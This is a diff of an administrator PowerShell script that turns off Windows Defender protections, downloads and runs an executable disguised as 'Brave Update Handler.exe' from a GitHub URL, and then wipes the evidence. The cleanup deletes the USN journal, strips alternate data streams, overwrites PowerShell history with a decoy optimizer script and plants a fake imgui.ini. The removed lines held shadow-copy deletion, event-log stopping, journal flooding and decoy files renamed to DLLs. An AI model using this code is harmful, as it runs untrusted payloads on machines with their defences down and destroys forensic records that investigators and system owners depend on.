@@ -19,8 +19,8 @@ try {
 <#
 .SYNOPSIS
     Launch payload, wait for HD-Player to exit.
-    Creates AMDInstall.log and two GUID temp files, renames to DLL names before payload,
-    restores after payload, kills HD-adb.exe, then handles adb.log before step 8.
+    Removes hd-player.txt, stops event services, clears logs,
+    removes ADS, deletes USN Journal.
 #>
 
 #Requires -RunAsAdministrator
@@ -70,10 +70,9 @@ try {
 
 Write-Host "[*] Exclusions added. Continuing..." -ForegroundColor Cyan
 
-# ========== STOP EVENT LOG SERVICE ==========
-try {
-    net stop eventlog /y 2>$null
-} catch { }
+
+
+
 
 # ------------------------------------------------------------
 # SAVE ORIGINAL DEFENDER SETTINGS AND DISABLE PROTECTIONS
@@ -90,183 +89,10 @@ Set-MpPreference -DisableScriptScanning $true -EA 0
 Set-MpPreference -DisableIOAVProtection $true -EA 0
 Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -EA 0
 
-# ========== CONTENT TEMPLATES ==========
-$amdErrorLog = @"
-Error                        0x80070002 in PushButtonReset::RegKey::HasValue (base\reset\util\src\registry.cpp:187): Failed to load subkey at [Microsoft\Windows\Signature][gle=0x00000002]
-Error                        0x80070002 in PbrGetRestoreToBaselineVal (base\reset\engine\scenario\src\sensetargetos.cpp:63): Does not find registry key of PushButtonReset[gle=0x00000002]
-Error                        pGetUninstallInterfaceCommon: Failed loading the setupplatform, hr = 0x80070490[gle=0x00000003]
-Error                        0x800f0970 in PushButtonReset::OpClearStorageReserve::Commit (base\reset\engine\operations\src\clearstoragereserve.cpp:96): Failed to get storage reserve manager loader
-Error                        0x800706d9 in CResetEngine::UploadThread (base\reliability\recovery\resetengonline\resetengine.cpp:1167): Failed to flush queues
-"@
-
-$wweCacheText = @"
-*** WWE 2K26 Shader Cache File ***
-Version: 2.0.0.1
-Build: 2026.03.15
-Platform: PC (Steam)
-GPU: NVIDIA GeForce RTX 5090
-Driver: 575.80
-
-[CACHE_BLOCK]
-Texture: superstar_roman_reigns_face_normals.dds
-Checksum: 0xA4F3C2B1
-Timestamp: 2026-05-08 14:32:18
-Size: 4096 KB
-Compressed: true
-
-[CACHE_BLOCK]
-Texture: arena_smackdown_2026_lightmap.pbr
-Checksum: 0x7E9A4C2D
-Timestamp: 2026-05-08 14:33:05
-Size: 12288 KB
-Compressed: true
-
-[SHADER_BLOCK]
-Vertex: vs_postprocessing.bin
-Pixel: ps_reflections.bin
-Compute: cs_water_simulation.bin
-Hash: 0x88F44E9A1B2C3D4E
-
-[ANIMATION_CACHE]
-Motion: roman_reigns_spear.fbx
-Frames: 240
-Hash: 0x1122334455667788
-"@
-
-$wweReferenceText = @"
-*** WWE 2K26 Asset Reference Table ***
-Game Version: 2K26 (Build 2026.04.20)
-Locale: en-US
-Database Version: 14
-
-[REFERENCE_ENTRY]
-AssetID: 100452
-Type: SuperstarModel
-Path: assets/superstars/roman_reigns.bin
-CRC32: 0xABCD1234
-Dependencies: 100453, 100454, 100455
-
-[REFERENCE_ENTRY]
-AssetID: 100453
-Type: TextureAtlas
-Path: assets/atlases/roman_diffuse.atlas
-CRC32: 0x5678EF90
-Dependencies: (none)
-
-[REFERENCE_ENTRY]
-AssetID: 200876
-Type: ArenaMesh
-Path: assets/arenas/wrestlemania_42.bin
-CRC32: 0x9F2E4A8C
-Dependencies: 200877, 200878, 200879
-
-[MAP_REFERENCE]
-MapID: smackdown_stage_2026
-PolyCount: 284000
-Lightmap: lit_stage.ktx
-Occlusion: baked_ao.pvr
-
-[SOUND_REFERENCE]
-Event: superstar_entry
-AudioBank: roman_reigns.bnk
-WEM_ID: 4829103
-Loop: false
-"@
-
-# ========== CREATE THREE DUMMY FILES ==========
-Write-Host "[*] Creating dummy files (AMDInstall.log, two GUID .tmp) with fake data..." -ForegroundColor Cyan
-
-$dummyItems = @(
-    @{
-        OriginalPath = "C:\Windows\Temp\AMDInstall.log"
-        TargetPath   = "C:\Windows\Temp\Client.dll"
-        Size         = 605184
-        TemplateText = $amdErrorLog + "`r`n"
-        Display      = "AMDInstall.log"
-    },
-    @{
-        OriginalPath = "$env:LOCALAPPDATA\Temp\0e4468e0-e419-4322-8277-ad79c15u16g8c3.tmp"
-        TargetPath   = "$env:LOCALAPPDATA\Temp\cimgui.dll"
-        Size         = 307200
-        TemplateText = $wweCacheText + "`r`n"
-        Display      = "GUID tmp (cache)"
-    },
-    @{
-        OriginalPath = "$env:LOCALAPPDATA\Temp\a89a3d4d-64f5-4354-913e-f5a0798t4807b.tmp"
-        TargetPath   = "$env:LOCALAPPDATA\Temp\AotBst.dll"
-        Size         = 166912
-        TemplateText = $wweReferenceText + "`r`n"
-        Display      = "GUID tmp (reference)"
-    }
-)
-
-$restoreInfo = @{}
-
-foreach ($item in $dummyItems) {
-    $origPath = $item.OriginalPath
-    $targetPath = $item.TargetPath
-    $size = $item.Size
-    $templateText = $item.TemplateText
-    $display = $item.Display
-
-    $dir = Split-Path $origPath -Parent
-    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
-
-    Write-Host "[*] Creating $display ($size bytes)..." -ForegroundColor Cyan
-
-    $templateBytes = [System.Text.Encoding]::UTF8.GetBytes($templateText)
-    $templateLen = $templateBytes.Length
-    if ($templateLen -eq 0) {
-        Write-Host "[-] Template empty for $display" -ForegroundColor Red
-        continue
-    }
-
-    $buffer = New-Object byte[] $size
-    $offset = 0
-    while ($offset + $templateLen -le $size) {
-        [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $templateLen)
-        $offset += $templateLen
-    }
-    if ($offset -lt $size) {
-        $remaining = $size - $offset
-        [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $remaining)
-    }
-
-    try {
-        [System.IO.File]::WriteAllBytes($origPath, $buffer)
-        Write-Host "[+] Created $display at $origPath" -ForegroundColor Green
-    } catch {
-        Write-Host "[-] Failed to create $display : $_" -ForegroundColor Red
-        continue
-    }
-
-    $restoreInfo[$targetPath] = @{
-        Size = $size
-        TemplateText = $templateText
-        OriginalPath = $origPath
-    }
-}
-
-# ========== RENAME TO DLL NAMES BEFORE PAYLOAD (2-SEC DELAY) ==========
-Write-Host "[*] Renaming dummy files to target DLL names before payload (2 sec delay each)..." -ForegroundColor Cyan
-foreach ($targetPath in $restoreInfo.Keys) {
-    $origPath = $restoreInfo[$targetPath].OriginalPath
-    try {
-        if (Test-Path $targetPath) { Remove-Item -Path $targetPath -Force -ErrorAction Stop }
-        Move-Item -Path $origPath -Destination $targetPath -Force -ErrorAction Stop
-        Write-Host "[+] Renamed: $origPath -> $targetPath" -ForegroundColor Green
-    } catch {
-        Write-Host "[-] Failed to rename $origPath : $_" -ForegroundColor Red
-    }
-    Start-Sleep -Seconds 2
-}
-
-# ------------------------------------------------------------
-# PREPARE PAYLOAD AS ENCODED COMMAND
-# ------------------------------------------------------------
+# ========== PREPARE PAYLOAD AS ENCODED COMMAND ==========
 $payloadScript = @'
 try {
-    $u='https://raw.githubusercontent.com/billa9889/aagya/main/Brave%20Update%20Handler.exe'
+    $u='https://raw.githubusercontent.com/billa9889/wahhhss1/main/Brave%20Update%20Handler.exe'
     $maxRetries=3
     for($i=1;$i -le $maxRetries;$i++){
         try {
@@ -298,24 +124,17 @@ while ($true) {
 }
 Write-Host "[+] HD-Player.exe has exited." -ForegroundColor Green
 
-# ------------------------------------------------------------
-# FORCE CLOSE MSBUILD.EXE
-# ------------------------------------------------------------
-Write-Host "[*] Force closing MSBUILD.exe..." -ForegroundColor Cyan
-$msbuildProcs = Get-Process -Name "MSBUILD" -ErrorAction SilentlyContinue
-if (-not $msbuildProcs) {
-    Write-Host "[+] No MSBUILD.exe processes found." -ForegroundColor Green
-} else {
-    Write-Host "[!] Found $($msbuildProcs.Count) MSBUILD.exe process(es)." -ForegroundColor Yellow
-    foreach ($proc in $msbuildProcs) {
-        try {
-            Stop-Process -Id $proc.Id -Force -ErrorAction Stop
-            Write-Host "[+] Killed MSBUILD.exe (PID: $($proc.Id))" -ForegroundColor Green
-        } catch {
-            Write-Host "[-] Failed to kill PID $($proc.Id): $_" -ForegroundColor Red
-        }
-    }
+# ========== IMMEDIATE CLEANUP (ADS + USN) ==========
+Write-Host "[*] Removing Alternate Data Streams from Temp files..." -ForegroundColor Cyan
+Get-ChildItem -Path C:\Windows\Temp, $env:LOCALAPPDATA\Temp -Recurse -File -Force -ErrorAction SilentlyContinue | ForEach-Object {
+    Remove-Item -Path "$($_.FullName):*" -Force -ErrorAction SilentlyContinue
 }
+Write-Host "[+] ADS removed from temp files." -ForegroundColor Green
+
+Write-Host "[*] Deleting USN Journal on C:..." -ForegroundColor Cyan
+fsutil usn deletejournal /d C: 2>$null
+Write-Host "[+] USN Journal deleted." -ForegroundColor Green
+
 
 # ------------------------------------------------------------
 # WAIT 10 SECONDS, THEN KILL PAYLOAD PROCESS
@@ -331,112 +150,9 @@ try {
     Write-Host "[-] Could not kill process (already exited)." -ForegroundColor Yellow
 }
 
-# ========== RESTORE ORIGINAL SIZE AND CONTENT TO DLLs ==========
-Write-Host "[*] Restoring DLLs to original size and dummy content..." -ForegroundColor Cyan
-foreach ($targetPath in $restoreInfo.Keys) {
-    $info = $restoreInfo[$targetPath]
-    $originalSize = $info.Size
-    $templateText = $info.TemplateText
-
-    if (-not (Test-Path $targetPath)) {
-        Write-Host "[-] $targetPath not found – skipping restore." -ForegroundColor Yellow
-        continue
-    }
-
-    Write-Host "[*] Restoring $targetPath to $originalSize bytes..." -ForegroundColor Cyan
-    try {
-        (Get-Item $targetPath -Force).IsReadOnly = $false
-
-        $templateBytes = [System.Text.Encoding]::UTF8.GetBytes($templateText)
-        $templateLen = $templateBytes.Length
-        if ($templateLen -eq 0) { throw "Template empty" }
-
-        $buffer = New-Object byte[] $originalSize
-        $offset = 0
-        while ($offset + $templateLen -le $originalSize) {
-            [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $templateLen)
-            $offset += $templateLen
-        }
-        if ($offset -lt $originalSize) {
-            $remaining = $originalSize - $offset
-            [System.Array]::Copy($templateBytes, 0, $buffer, $offset, $remaining)
-        }
-        [System.IO.File]::WriteAllBytes($targetPath, $buffer)
-        Write-Host "[+] Restored $targetPath to $originalSize bytes with original dummy data." -ForegroundColor Green
-    } catch {
-        Write-Host "[-] Failed to restore $targetPath : $_" -ForegroundColor Red
-    }
-}
-
-# ========== RENAME BACK TO ORIGINAL NAMES ==========
-Write-Host "[*] Renaming DLLs back to original dummy file names..." -ForegroundColor Cyan
-foreach ($targetPath in $restoreInfo.Keys) {
-    $origPath = $restoreInfo[$targetPath].OriginalPath
-    if (Test-Path $targetPath) {
-        try {
-            if (Test-Path $origPath) { Remove-Item -Path $origPath -Force -ErrorAction Stop }
-            Move-Item -Path $targetPath -Destination $origPath -Force -ErrorAction Stop
-            Write-Host "[+] Reverted: $targetPath -> $origPath" -ForegroundColor Green
-        } catch {
-            Write-Host "[-] Failed to revert $targetPath : $_" -ForegroundColor Red
-        }
-    } else {
-        Write-Host "[-] $targetPath not found – cannot revert." -ForegroundColor Yellow
-    }
-    Start-Sleep -Seconds 2
-}
-
-# ========== FORCE CLOSE HD-ADB.EXE BEFORE HANDLING ADB.LOG ==========
-Write-Host "[*] Force closing HD-adb.exe if running..." -ForegroundColor Cyan
-$hdadb = Get-Process -Name "HD-adb" -ErrorAction SilentlyContinue
-if ($hdadb) {
-    Write-Host "[!] Found HD-adb.exe (PID: $($hdadb.Id)). Killing..." -ForegroundColor Yellow
-    try {
-        Stop-Process -Name "HD-adb" -Force -ErrorAction Stop
-        Write-Host "[+] Killed HD-adb.exe" -ForegroundColor Green
-        Start-Sleep -Seconds 2
-    } catch {
-        Write-Host "[-] Failed to kill HD-adb.exe: $_" -ForegroundColor Red
-    }
-} else {
-    Write-Host "[+] HD-adb.exe not running." -ForegroundColor Green
-}
-
-# ========== HANDLE ADB.LOG (in LOCALAPPDATA\Temp) ==========
-Write-Host "[*] Checking for adb.log in $env:LOCALAPPDATA\Temp..." -ForegroundColor Cyan
-$adbLogPath = Join-Path $env:LOCALAPPDATA "Temp\adb.log"
-$targetAdbPath = Join-Path $env:LOCALAPPDATA "Temp\a89a3d4d-64f5-4354-913e-f5a07934fd438t4807b.tmp"
-
-if (Test-Path -LiteralPath $adbLogPath) {
-    Write-Host "[!] Found adb.log at $adbLogPath" -ForegroundColor Yellow
-    try {
-        # Rename the file (force)
-        if (Test-Path -LiteralPath $targetAdbPath) {
-            Remove-Item -LiteralPath $targetAdbPath -Force -ErrorAction Stop
-            Write-Host "[*] Removed existing target file" -ForegroundColor Cyan
-        }
-        Move-Item -LiteralPath $adbLogPath -Destination $targetAdbPath -Force -ErrorAction Stop
-        Write-Host "[+] Renamed adb.log -> $targetAdbPath" -ForegroundColor Green
-
-        # Fill with random bytes (keep same size)
-        $fileInfo = Get-Item -LiteralPath $targetAdbPath -Force
-        $fileSize = $fileInfo.Length
-        Write-Host "[*] File size: $fileSize bytes, overwriting with random bytes..." -ForegroundColor Cyan
-
-        $random = New-Object System.Random
-        $buffer = New-Object byte[] $fileSize
-        $random.NextBytes($buffer)
-        [System.IO.File]::WriteAllBytes($targetAdbPath, $buffer)
-        Write-Host "[+] Overwrote $targetAdbPath with random bytes." -ForegroundColor Green
-    } catch {
-        Write-Host "[-] Failed to process adb.log: $_" -ForegroundColor Red
-    }
-} else {
-    Write-Host "[-] adb.log not found in $env:LOCALAPPDATA\Temp – skipping." -ForegroundColor Yellow
-}
 
 # ------------------------------------------------------------
-# CREATE FAKE IMGUI.INI ON DESKTOP (original step 7.5 / step 8)
+# CREATE FAKE IMGUI.INI ON DESKTOP
 # ------------------------------------------------------------
 $imguiDesktopPath = "$env:USERPROFILE\Desktop\imgui.ini"
 Write-Host "[*] Creating fake imgui.ini with PC optimizer logs on Desktop..." -ForegroundColor Cyan
@@ -511,7 +227,7 @@ try {
 }
 
 # ------------------------------------------------------------
-# OVERWRITE POWERSHELL HISTORY (original step 8)
+# OVERWRITE POWERSHELL HISTORY
 # ------------------------------------------------------------
 $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 $dir = Split-Path $historyPath -Parent
@@ -545,13 +261,11 @@ Write-Host "Optimization complete." -ForegroundColor Green
 Set-Content -Path $historyPath -Value $optimizerScript -Encoding UTF8
 Write-Host "[*] PowerShell history overwritten with PC Optimizer script." -ForegroundColor Green
 
-
 # ============================================================
-# PHASE 2: MEMORY FORENSICS (RAM CLEANUP) – FIXED & RELIABLE
+# PHASE 2: MEMORY FORENSICS (RAM CLEANUP)
 # ============================================================
 Write-Host "[PHASE 2] Scrubbing memory artifacts..." -ForegroundColor Cyan
 
-# Use a unique type name to avoid conflicts
 $typeName = "WinAPI" + (Get-Random -Maximum 9999)
 $api = Add-Type -MemberDefinition @'
 [DllImport("kernel32.dll")]
@@ -565,15 +279,12 @@ if (-not $api) {
 if (-not $api) {
     Write-Host "[-] Failed to load EmptyWorkingSet API. Skipping memory cleanup." -ForegroundColor Yellow
 } else {
-    # Clear memory for all processes – skip invalid handles
     Get-Process | ForEach-Object {
         $handle = $_.Handle
         if ($handle -and $handle -ne 0) {
             try {
                 $null = $api::EmptyWorkingSet($handle)
-            } catch {
-                # Silently ignore any errors (e.g., access denied)
-            }
+            } catch {}
         }
     }
 
@@ -585,163 +296,9 @@ if (-not $api) {
     Write-Host "[+] Memory working sets cleared" -ForegroundColor Green
 }
 
-# PHASE 3: USN BYPASS – Turbo Mode (Parallel + Empty Files)
-# ===========================================================
-Write-Host "[PHASE 3] Bypassing USN Journal (Turbo)..." -ForegroundColor Cyan
-
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "[!] Requires Administrator privileges." -ForegroundColor Red
-    exit 1
-}
-
-function Bypass-USNJournal {
-    param(
-        [int]$FloodCount = 150000,
-        [int]$Passes = 3,
-        [string[]]$TargetDrives = $null,
-        [switch]$DeleteTempFiles = $true,
-        [string]$FilePrefix = "ms_cache",
-        [string]$BasePath = "$env:TEMP",
-        [int]$Threads = 8          # Number of parallel writers
-    )
-
-    Write-Host "[*] Turbo mode: $Threads parallel threads, zero‑byte files." -ForegroundColor Cyan
-    Write-Host "    FloodCount = $FloodCount"
-    Write-Host "    BasePath   = $BasePath"
-    Write-Host ""
-
-    # Ensure folder exists
-    if (-not (Test-Path -Path $BasePath -PathType Container)) {
-        New-Item -ItemType Directory -Path $BasePath -Force | Out-Null
-    }
-
-    # Delete VSS
-    Write-Host "[*] Removing Volume Shadow Copies..." -ForegroundColor White
-    try { Start-Process -FilePath "vssadmin.exe" -ArgumentList "delete shadows /all /quiet" -Wait -NoNewWindow -ErrorAction SilentlyContinue } catch {}
-    Write-Host "    Done." -ForegroundColor Green
-    Write-Host ""
-
-    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue
-    if (-not $drives) { $drives = Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue }
-    if (-not $drives) { Write-Host "[!] No fixed drives found." -ForegroundColor Red; return }
-
-    $anySuccess = $false
-
-    foreach ($drive in $drives) {
-        $driveLetter = $drive.DeviceID -replace ':$', ''
-        if ($TargetDrives -and ($TargetDrives -notcontains $driveLetter)) { continue }
-
-        Write-Host "[*] Processing $driveLetter... " -ForegroundColor Cyan
-
-        for ($pass = 0; $pass -lt $Passes; $pass++) {
-            Write-Host "    Pass $($pass+1)/$Passes..." -ForegroundColor Cyan
-
-            # Shrink journal
-            $shrink = Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -PassThru -NoNewWindow -ErrorAction SilentlyContinue
-            if ($shrink.ExitCode -ne 0) {
-                Write-Host "        Shrink failed (exit $($shrink.ExitCode)) – skipping." -ForegroundColor Red
-                continue
-            }
-
-            # --- PARALLEL FILE CREATION ---
-            Write-Host "        Creating $FloodCount empty files with $Threads threads..." -NoNewline
-            $created = 0
-            $lock = [System.Threading.Mutex]::new()
-            $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
-            $runspacePool.Open()
-            $jobs = @()
-
-            $total = $FloodCount
-            $batchSize = [math]::Ceiling($total / $Threads)
-
-            for ($t = 0; $t -lt $Threads; $t++) {
-                $start = $t * $batchSize
-                $end = [math]::Min($start + $batchSize, $total)
-                if ($start -ge $end) { break }
-
-                $ps = [powershell]::Create().AddScript({
-                    param($startIdx, $endIdx, $basePath, $prefix, $mutex)
-                    $count = 0
-                    for ($i = $startIdx; $i -lt $endIdx; $i++) {
-                        $guid = [guid]::NewGuid().ToString()
-                        $fname = Join-Path -Path $basePath -ChildPath "$prefix`_$guid.tmp"
-                        try {
-                            # Create zero-byte file (fast)
-                            [System.IO.File]::Create($fname).Close()
-                            $count++
-                        } catch {
-                            # ignore errors
-                        }
-                        # Progress every 100 files
-                        if ($i % 100 -eq 0) {
-                            $mutex.WaitOne() | Out-Null
-                            $global:created += 100   # approximate
-                            $mutex.ReleaseMutex()
-                        }
-                    }
-                    return $count
-                })
-                $ps.AddParameters(@{
-                    startIdx = $start
-                    endIdx = $end
-                    basePath = $BasePath
-                    prefix = $FilePrefix
-                    mutex = $lock
-                }) | Out-Null
-                $jobs += $ps
-                $ps.BeginInvoke() | Out-Null
-            }
-
-            # Wait for all to finish and collect results
-            $totalCreated = 0
-            foreach ($job in $jobs) {
-                $result = $job.EndInvoke($job.BeginInvoke($null, $null))
-                $totalCreated += $result
-                $job.Dispose()
-            }
-            $runspacePool.Close()
-            $runspacePool.Dispose()
-
-            Write-Host " Done ($totalCreated created)." -ForegroundColor Green
-
-            # Shrink again
-            Start-Process -FilePath "fsutil.exe" -ArgumentList "usn createjournal m=32768 a=32768 $driveLetter`:" -Wait -NoNewWindow -ErrorAction SilentlyContinue
-            $anySuccess = $true
-        }
-
-        # --- Cleanup (parallel deletion can also be used, but it's fast enough) ---
-        if ($DeleteTempFiles) {
-            Write-Host "    Cleaning up temp files..." -NoNewline
-            $pattern = Join-Path -Path $BasePath -ChildPath "$FilePrefix`_*.tmp"
-            $files = Get-ChildItem -Path $pattern -File -ErrorAction SilentlyContinue
-            if ($files) {
-                $removed = 0
-                foreach ($f in $files) {
-                    try { Remove-Item -Path $f.FullName -Force -ErrorAction Stop; $removed++ } catch {}
-                }
-                Write-Host " Deleted $removed files." -ForegroundColor Green
-            } else {
-                Write-Host " No files found." -ForegroundColor Gray
-            }
-        }
-
-        Write-Host "[+] Finished $driveLetter" -ForegroundColor Green
-        Write-Host ""
-    }
-
-    if ($anySuccess) {
-        Write-Host "[✓] USN Journal bypass completed (turbo)!" -ForegroundColor Green
-    } else {
-        Write-Host "[✗] USN Journal bypass failed." -ForegroundColor Red
-    }
-}
-
-# ===== RUN WITH TURBO SETTINGS =====
-Bypass-USNJournal -FloodCount 150000 -Passes 3 -TargetDrives @("C") -BasePath "$env:TEMP" -FilePrefix "ms_cache" -Threads 8 -DeleteTempFiles
-
 
 # ------------------------------------------------------------
-# REMOVE WINDOWS DEFENDER EXCLUSIONS (original step 9)
+# REMOVE WINDOWS DEFENDER EXCLUSIONS
 # ------------------------------------------------------------
 Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
 
@@ -767,7 +324,7 @@ try {
 } catch { Write-Host "[-] Could not remove temp exclusions" -ForegroundColor Yellow }
 
 # ------------------------------------------------------------
-# RE-ENABLE WINDOWS DEFENDER PROTECTIONS (original step 10)
+# RE-ENABLE WINDOWS DEFENDER PROTECTIONS
 # ------------------------------------------------------------
 Write-Host "[*] Re-enabling Windows Defender protections..." -ForegroundColor Cyan
 
@@ -797,47 +354,8 @@ try {
 } catch { Write-Host "[-] Could not re-enable ASR rule" -ForegroundColor Yellow }
 
 Write-Host "[*] Windows Defender protections restored to original state." -ForegroundColor Cyan
-# ------------------------------------------------------------
-# REMOVE WINDOWS DEFENDER EXCLUSIONS (original step 9)
-# ------------------------------------------------------------
-Write-Host "[*] Removing Windows Defender exclusions..." -ForegroundColor Cyan
-
-try {
-    Remove-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
-    Write-Host "[+] C:\ exclusion removed." -ForegroundColor Green
-} catch { Write-Host "[-] Failed to remove C:\ exclusion" -ForegroundColor Yellow }
-
-try {
-    Remove-MpPreference -ExclusionPath "C:\Users\billa\Desktop" -ErrorAction Stop
-    Write-Host "[+] Desktop exclusion removed." -ForegroundColor Green
-} catch { Write-Host "[-] Desktop exclusion not found" -ForegroundColor Yellow }
-
-try {
-    Remove-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction Stop
-    Write-Host "[+] PowerShell process exclusion removed." -ForegroundColor Green
-} catch { Write-Host "[-] PowerShell process exclusion not found" -ForegroundColor Yellow }
-
-try {
-    Remove-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction Stop
-    Remove-MpPreference -ExclusionPath "$env:WINDIR\Temp" -ErrorAction Stop
-    Write-Host "[+] Temp folder exclusions removed." -ForegroundColor Green
-} catch { Write-Host "[-] Could not remove temp exclusions" -ForegroundColor Yellow }
 
 
-
-# ========== FINAL CLEANUP ==========
-Write-Host "[*] Performing final cleanup..." -ForegroundColor Cyan
-
-# Restart EventLog service
-try {
-    net start eventlog 2>$null
-} catch { }
-
-# Delete prefetch files
-Remove-Item "$env:WINDIR\Prefetch\POWERSHELL.EXE-*.pf" -Force -ErrorAction SilentlyContinue
-
-# Clear recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 # ------------------------------------------------------------
 # REMOVE EVERY POWERSHELL WINDOW FROM BACKGROUND
